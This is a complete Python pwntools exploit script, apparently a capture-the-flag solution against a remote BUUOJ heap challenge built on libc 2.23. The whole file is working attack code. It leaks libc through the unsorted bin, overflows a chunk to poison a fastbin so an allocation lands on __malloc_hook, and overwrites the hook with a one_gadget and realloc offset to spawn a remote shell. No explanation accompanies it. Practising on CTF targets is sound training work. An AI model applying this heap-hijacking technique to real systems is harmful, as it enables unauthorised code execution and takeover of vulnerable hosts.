#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'
context.terminal='wt.exe bash -c'.split(' ')

# sh = process('./pwn')
sh = remote('node4.buuoj.cn', 25386)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')

def menu(idx: int):
    sh.recvuntil(b'5. exit')
    sh.sendline(str(idx).encode())

def add(size: int, content: bytes):
    menu(1)
    sh.recvuntil(b'The length of your content --->')
    sh.sendline(str(size).encode())
    sh.recvuntil(b'Content --->')
    sh.send(content)

def edit(idx: int, length: int, content: bytes):
    menu(2)
    sh.recvuntil(b'Index --->')
    sh.sendline(str(idx).encode())
    sh.recvuntil(b'The length of your content --->')
    sh.sendline(str(length).encode())
    sh.recvuntil(b'Content --->')
    sh.send(content)

def delete(idx: int):
    menu(3)
    sh.recvuntil(b'Index --->')
    sh.sendline(str(idx).encode())

def show(idx: int):
    menu(4)
    sh.recvuntil(b'Index --->')
    sh.sendline(str(idx).encode())
    sh.recvuntil(b'Content: ')

add(0x90, b'A')  # 0
add(0x60, b'B')  # 1
add(0x20, b'B')  # 2
delete(0)
show(0)


libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x3c4b78
__malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
system = libc_base + libc.sym['system']
success('libc_base -> {}'.format(hex(libc_base)))


delete(1)
edit(0, 0xd0, p64(libc_base + 0x3c4b78)*2 + b'\x00'*0x88 + p64(0x70) + p64(__malloc_hook-0x23))
add(0x60, b'/bin/sh\x00')  # 3
og = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
add(0x60, b'\x00'*(0x13-0x08) + p64(libc_base + og[3]) + p64(realloc+4))  # 4
# gdb.attach(sh, f'b malloc')
# success('realloc -> {}'.format(hex(og[2] + libc_base)))
# pause(3)
menu(1)
sh.recvuntil(b'The length of your content --->')
sh.sendline(str(0x20).encode())

sh.interactive()